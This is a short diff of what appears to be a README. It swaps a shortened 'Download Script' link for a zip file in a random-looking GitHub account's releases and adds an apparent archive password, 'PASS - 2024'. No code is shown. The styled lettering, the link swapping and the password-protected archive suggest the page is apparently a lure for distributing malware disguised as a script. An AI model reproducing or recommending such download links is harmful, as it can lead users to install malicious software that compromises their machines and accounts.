@@ -1,5 +1,5 @@
 
-# Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://bit.ly/41fJaUh)***
+# Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://github.com/dinorahlaughing475/nds/releases/download/Download/Script.Github.zip)***
 # PASS - 2024
 
 ![maxresdefault](https://github.com/user-attachments/assets/6abe7298-f751-4f66-9aac-f17f37cb2d99)
